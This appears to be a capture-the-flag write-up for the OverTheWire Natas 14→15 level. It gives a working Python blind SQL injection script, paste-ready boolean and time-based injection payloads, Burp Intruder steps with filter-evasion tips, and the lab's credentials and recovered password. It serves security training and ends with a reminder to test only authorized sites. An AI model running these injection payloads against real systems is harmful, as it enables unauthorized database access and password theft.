# 🔐 Natas Level: Natas14--->Natas15



### 📂 Execution Process 
👉
- use this python script
```
import requests
url = 'http://natas15.natas.labs.overthewire.org/index.php'
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
seen = ''   # start empty
max_len = 32

auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

for length in range(1, max_len + 1):
    found = False
    for ch in charset:
        guess = seen + ch
        payload = f'natas16" AND BINARY LEFT(password,{length}) = "{guess}" -- '
        response = requests.post(url, data={'username': payload}, auth=auth, timeout=10)
        if "This user exists." in response.text:
            seen = guess
            print(length, seen)
            found = True
            break
    if not found:
        print("No matching char found at position", length)
        break

print("Password (found prefix):", seen)
```

- Run the python script in the terminal using the command
```
python3 script.py
```
<img width="1452" height="541" alt="Screenshot 2025-10-06 at 11 05 32 AM" src="https://github.com/user-attachments/assets/36d4b2e3-7e47-44d3-ab97-27a3af01ca5b" />

### 📄 Password found:
👉 
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

### NOTES
# Simple notes for Natas (plain, easy English)

1) One short sentence (what the script does)
The script guesses the password one character at a time by asking the website a yes/no question for each guess. If the site answers "yes" (shows the success message), we keep that character and move to the next.

2) Step-by-step (very simple)
- Make a list of possible characters: a to z, A to Z, 0 to 9.
- Start with an empty known prefix.
- For position 1 (the first character), try every character from the list:
  a, b, c, ..., Z, 0, 1, 2, ...
- For each try, send a special username that asks:
  "Does the password start with THIS prefix?"
- The server will return a page. If it shows the success message (for example: This user exists.), the guess is correct.
- When you find the correct character, add it to the prefix and do the same for the next position.
- Repeat until you find all 32 characters or you stop.

3) Why this works (very simple)
- The site checks a database row for the username.
- We put a secret condition in the username that asks about natas16's password.
- That condition becomes true only when our guess is right.
- The page shows a different message when the condition is true, so we learn the correct character.

4) Important checks if things fail
- Make sure HTTP Basic Auth is being sent. If auth is missing, the server will not behave the same.
- Make sure the POST parameter name is correct (usually "username"). If the form uses a different name, use that.
- Make sure you check for the exact success message text. It must match exactly.
- Try different SQL comment styles: use either two dashes with a space at the end (-- ) or the hash sign (#).
- If the site never shows a different message, use a time-based check (make the server sleep when the condition is true and measure response time).

5) Example plain payloads to paste (use the one that works for your site, try them in Repeater first)
- Basic boolean style (replace X with the character you test):
  natas15" AND EXISTS(SELECT * FROM users WHERE username='natas16' AND BINARY LEFT(password,1) = "X") -- 
- Alternate boolean style:
  natas15" AND (SELECT BINARY LEFT(password,1) FROM users WHERE username='natas16') = "X" -- 
- Time-based fallback (sleeps 3 seconds when true):
  natas15" AND IF((SELECT BINARY LEFT(password,1) FROM users WHERE username='natas16') = "X", SLEEP(3), 0) -- 

6) How to use Burp Intruder quickly (plain steps)
- Capture a normal POST request in Proxy.
- Send to Intruder.
- Clear auto-markers.
- Put one marker only on the single character inside the quotes where you want to try values. Example position body:
  natas15" AND EXISTS(SELECT * FROM users WHERE username='natas16' AND BINARY LEFT(password,1) = "§" ) -- 
- Choose attack type: Sniper.
- Payloads: paste one character per line (list below).
- Options: Grep - Match add the success text (This user exists.) so hits are highlighted.
- Start attack. Note the payload that shows the success text — that is the correct character.
- Update the prefix/length and repeat.

7) Newline-separated charset (paste this into Intruder payload set 1, one per line)
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
1
2
3
4
5
6
7
8
9
0

8) Small debugging tips (short)
- If nothing matches, print the response body to check exact text.
- Try different comment styles: --  or  #
- Try single quotes instead of double quotes if the app strips double quotes.
- Add a small wait between requests to avoid rate limiting.
- If page never changes, use time-based payloads and look for longer response times.

9) Safety reminder
Only try this on authorized training sites like OverTheWire. Do not test real websites without permission.

10) Final small script idea (concept only)
- Loop positions 1 to 32.
- For each position, try all charset characters.
- For each try, send a request with the payload that checks LEFT(password, position) = prefix+char.
- If response shows success, accept char and move on.
- If none match, try time-based or check your request format/auth.


